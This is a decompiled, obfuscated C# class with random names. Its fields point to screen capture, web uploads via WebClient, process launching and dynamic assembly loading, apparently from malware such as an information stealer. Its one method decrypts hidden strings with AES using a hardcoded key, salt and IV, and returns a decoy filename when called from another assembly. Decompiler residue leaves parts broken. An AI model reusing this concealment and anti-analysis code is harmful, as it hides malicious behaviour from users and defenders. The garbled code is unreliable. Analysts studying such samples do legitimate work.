using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace WPJx1;

internal class x8Mq
{
	internal class _4YXt4i
	{
		internal class DBSFj
		{
		}

		extern _003F ();

		extern _003F ();
	}

	private const string u = null;

	private const string VbX = null;

	private const string rV6LIA = null;

	public static string AY;

	public static string P0tdFo;

	public static Rectangle J;

	public static Rectangle _3InF;

	public static Bitmap NinpH;

	public static Graphics W42R;

	public static Rectangle f;

	public static WebClient mzMZ;

	public static NameValueCollection om7ca2;

	public static NameValueCollection FSM1dt;

	public static byte[] Q;

	public static string _7k;

	public static Regex l3u;

	public static Match U7bX;

	public static string CdTY;

	public static Assembly R8c;

	public static Stream uHvtB;

	public static byte[] KDY;

	public static k.Packet CPYo;

	public static WebClient zx;

	public static string _49ne8f;

	public static WebClient Dy2;

	public static Process _9cF;

	public static char[] eNcl1;

	public static string[] YdRj3U;

	public static byte[] oz;

	public static Regex i;

	public static string UDdHP;

	public static char[] _8hR;

	public static string YF6b;

	public static string[] axN5Ef;

	public static int V5EK;

	public static string Y;

	public static char[] x4TICU;

	public static DataContractJsonSerializer _7TV;

	public static MemoryStream _31L;

	public static string LyY2u;

	public static string RVv;

	public static WebClient i6;

	public static NameValueCollection UDFWj;

	public static string epF7;

	public static byte[] Hgcd2b;

	public static byte[] nV;

	public static MemoryStream tQwI;

	public static GZipStream lgii;

	public static byte[] dXlnPP;

	public static byte[] T;

	public static MemoryStream rB;

	public static GZipStream _0;

	public static byte[] vN5;

	public static byte[] dTE5l;

	public static string DmNSKV(string P_0)
	{
		//Discarded unreachable code: IL_0019, IL_0028, IL_0037, IL_0046, IL_0055, IL_005b, IL_0060, IL_006e, IL_007d, IL_008b, IL_009a, IL_00a9, IL_00b8, IL_00c7, IL_00d6, IL_00e5, IL_00f4, IL_0102, IL_0111, IL_011c, IL_012b, IL_013a, IL_0145, IL_0154, IL_0163, IL_0171, IL_0180, IL_018f, IL_019e, IL_01ad, IL_01bb, IL_01c9, IL_01d8, IL_01e6, IL_01f4, IL_0202, IL_0211, IL_0220, IL_022e, IL_0239, IL_0244, IL_0253, IL_0261, IL_026c, IL_027a, IL_0289, IL_0297, IL_02a2, IL_02ad, IL_02bc, IL_02ca, IL_02d8, IL_02e7, IL_02f6, IL_0305, IL_0313, IL_0322, IL_0330, IL_033f, IL_034e, IL_035d
		//IL_0028: Incompatible stack heights: 2 vs 1
		//IL_0037: Incompatible stack types: I4 vs O
		//IL_0046: Incompatible stack heights: 0 vs 1
		//IL_0060: Incompatible stack heights: 0 vs 1
		//IL_008b: Incompatible stack heights: 0 vs 1
		//IL_00a9: Incompatible stack heights: 2 vs 1
		//IL_00b8: Incompatible stack heights: 3 vs 1
		//IL_00c7: Incompatible stack heights: 2 vs 1
		//IL_00e5: Incompatible stack heights: 2 vs 1
		//IL_0102: Incompatible stack heights: 0 vs 1
		//IL_011c: Incompatible stack heights: 2 vs 1
		//IL_012b: Incompatible stack heights: 3 vs 1
		//IL_0145: Incompatible stack heights: 2 vs 1
		//IL_0154: Incompatible stack heights: 3 vs 1
		//IL_0171: Incompatible stack heights: 2 vs 1
		//IL_0180: Incompatible stack heights: 3 vs 1
		//IL_018f: Incompatible stack heights: 4 vs 1
		//IL_019e: Incompatible stack heights: 3 vs 1
		//IL_01bb: Incompatible stack heights: 0 vs 1
		//IL_01e6: Incompatible stack heights: 0 vs 1
		//IL_0202: Incompatible stack heights: 2 vs 1
		//IL_0211: Incompatible stack heights: 3 vs 1
		//IL_022e: Incompatible stack heights: 2 vs 1
		//IL_0239: Incompatible stack heights: 2 vs 1
		//IL_0244: Incompatible stack heights: 2 vs 1
		//IL_0253: Incompatible stack heights: 2 vs 1
		//IL_026c: Incompatible stack heights: 2 vs 1
		//IL_027a: Incompatible stack heights: 3 vs 1
		//IL_0289: Incompatible stack heights: 4 vs 1
		//IL_0297: Incompatible stack heights: 5 vs 1
		//IL_02a2: Incompatible stack heights: 5 vs 1
		//IL_02ad: Incompatible stack heights: 5 vs 1
		//IL_02bc: Incompatible stack heights: 2 vs 1
		//IL_02d8: Incompatible stack heights: 2 vs 1
		//IL_02f6: Incompatible stack heights: 0 vs 1
		//IL_0313: Incompatible stack heights: 2 vs 1
		//IL_0322: Incompatible stack heights: 3 vs 1
		//IL_0330: Incompatible stack heights: 4 vs 1
		//IL_034e: Incompatible stack heights: 2 vs 1
		//IL_035d: Incompatible stack heights: 2 vs 1
		_ = 2132010082L;
		if ((object)(Assembly.GetExecutingAssembly() != Assembly.GetCallingAssembly()) != null)
		{
			return "n4h.png";
		}
		byte[] array = Convert.FromBase64String(P_0);
		byte[] bytes = new Rfc2898DeriveBytes("p7K95451qB88sZ7J", Encoding.ASCII.GetBytes("2GM23j301t60Z96T")).GetBytes(32);
		ICryptoTransform transform = new RijndaelManaged
		{
			Mode = CipherMode.CBC,
			Padding = PaddingMode.PKCS7
		}.CreateDecryptor(bytes, Encoding.ASCII.GetBytes("IzTdhG6S8uwg141S"));
		MemoryStream memoryStream = new MemoryStream(array);
		CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
		byte[] array2 = new byte[array.Length];
		int count = cryptoStream.Read(array2, 0, array2.Length);
		memoryStream.Close();
		cryptoStream.Close();
		return Encoding.UTF8.GetString(array2, 0, count).TrimEnd("\0".ToCharArray());
	}
}
